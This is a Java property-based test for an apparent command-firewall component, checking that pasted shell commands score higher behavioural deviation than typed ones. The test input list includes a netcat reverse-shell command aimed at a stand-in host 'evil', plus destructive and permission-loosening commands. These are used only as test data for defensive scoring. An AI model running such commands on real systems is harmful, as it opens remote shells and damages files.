package com.intentguard.scoring;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.InputOrigin;

import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;
import net.jqwik.api.ForAll;
import net.jqwik.api.Property;
import net.jqwik.api.Provide;
import net.jqwik.api.constraints.DoubleRange;

/**
 * Feature: intentguard-semantic-firewall, Property 14: Pasted origin increases deviation and is explained.
 *
 * <p>For any two otherwise-identical Command_Events differing only in typed-vs-pasted origin, the
 * pasted event's Behavioral_Deviation is greater than or equal to the typed event's, and the
 * increase is at least as large in a command category with a lower typed-vs-pasted ratio
 * (Validates: Requirements 9.1, 9.2). This exercises the {@link BehavioralDeviationComponent}
 * deterministic scoring implemented in Task 6.4.
 *
 * <h2>Scope</h2>
 * <p>Property 14 also states that when a pasted event contributes to an ask/block decision the
 * Explanation must state the pasted origin (Req 9.3). That assertion belongs to the Explanation
 * Generator (Task 11.1), which does not exist yet, so it is covered by the flagged-decision
 * explanation property (Task 11.2). This test is scoped to the deviation-scoring invariants
 * (Req 9.1, 9.2) that the component is responsible for.
 *
 * <h2>Stability against concurrent work (Task 6.6)</h2>
 * <p>Every event here is a HUMAN command with {@code AgentRiskMarkers.none()} (built via
 * {@link ScoringTestSupport}) and the component is exercised directly rather than through the whole
 * pipeline, so any agent-risk uplift added by Task 6.6 cannot perturb these deviation invariants.
 */
class PastedOriginDeviationProperties {

    /**
     * A pasted Command_Event never deviates less than the otherwise-identical typed event, and the
     * pasted-minus-typed increase for a category with a lower typed-vs-pasted ratio is at least as
     * large as for a category with a higher ratio.
     */
    @Property(tries = 200)
    void pastedOriginIncreasesDeviationAndLowRatioAmplifies(
            @ForAll("commands") String commandText,
            @ForAll @DoubleRange(min = 0.0, max = 1.0) double ratioA,
            @ForAll @DoubleRange(min = 0.0, max = 1.0) double ratioB) {

        // The category the component will look up in typedPastedRatioByCategory for this command.
        String category = CommandNormalizer.category(commandText);
        double lowRatio = Math.min(ratioA, ratioB);
        double highRatio = Math.max(ratioA, ratioB);

        // Req 9.1: a pasted event's Behavioral_Deviation is >= the identical typed event's. Only the
        // typed-vs-pasted feature depends on origin (vocab/sequence/timing are identical), so pasted
        // can never score below typed for any profile. Check under an arbitrary category ratio.
        BehavioralDeviationComponent arbitraryComp = componentWithRatio(category, highRatio);
        double typedBaseline = deviation(arbitraryComp, event(commandText, InputOrigin.TYPED));
        double pastedBaseline = deviation(arbitraryComp, event(commandText, InputOrigin.PASTED));
        assertThat(pastedBaseline)
                .as("pasted deviation must be >= typed deviation for command '%s'", commandText)
                .isGreaterThanOrEqualTo(typedBaseline);

        // Req 9.2: where the profile shows a LOWER typed-vs-pasted ratio for the command's category,
        // the pasted increase over typed must be at least as large as for a HIGHER ratio.
        BehavioralDeviationComponent lowRatioComp = componentWithRatio(category, lowRatio);
        BehavioralDeviationComponent highRatioComp = componentWithRatio(category, highRatio);

        double lowIncrease = deviation(lowRatioComp, event(commandText, InputOrigin.PASTED))
                - deviation(lowRatioComp, event(commandText, InputOrigin.TYPED));
        double highIncrease = deviation(highRatioComp, event(commandText, InputOrigin.PASTED))
                - deviation(highRatioComp, event(commandText, InputOrigin.TYPED));

        assertThat(lowIncrease)
                .as("lower category ratio (%.4f) must amplify the pasted increase at least as much "
                        + "as a higher ratio (%.4f) for command '%s'", lowRatio, highRatio, commandText)
                .isGreaterThanOrEqualTo(highIncrease);
        assertThat(lowIncrease)
                .as("a pasted event must not decrease deviation for command '%s'", commandText)
                .isGreaterThanOrEqualTo(0.0);
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    /** A component backed by a fixed profile whose only learned signal is the category's ratio. */
    private static BehavioralDeviationComponent componentWithRatio(String category, double ratio) {
        ProfileSnapshot profile = ProfileSnapshot.builder()
                .typedPastedRatioByCategory(Map.of(category, ratio))
                .build();
        return new BehavioralDeviationComponent(ProfileSnapshotProvider.fixed(profile));
    }

    /** A HUMAN command event with no agent risk markers, differing only by input origin. */
    private static CommandEvent event(String commandText, InputOrigin origin) {
        return ScoringTestSupport.event(commandText, "/home/alice", null, origin);
    }

    private static double deviation(BehavioralDeviationComponent component, CommandEvent event) {
        return component.score(ScoringTestSupport.context(event)).score().getAsDouble();
    }

    @Provide
    Arbitrary<String> commands() {
        // A spread across the known command categories (vcs, network, filesystem, package,
        // orchestration, build, privilege) plus an unknown executable that falls back to "other",
        // so the category lookup is exercised broadly.
        return Arbitraries.of(
                "git status",
                "git commit -m x",
                "curl https://x",
                "wget http://y",
                "ssh host",
                "nc -e /bin/sh evil",
                "ls -la",
                "rm -rf /tmp/x",
                "cat file.txt",
                "npm install",
                "pip3 install pkg",
                "docker run img",
                "kubectl apply -f x",
                "mvn test",
                "sudo systemctl restart",
                "chmod 777 x",
                "unknownbin --flag");
    }
}
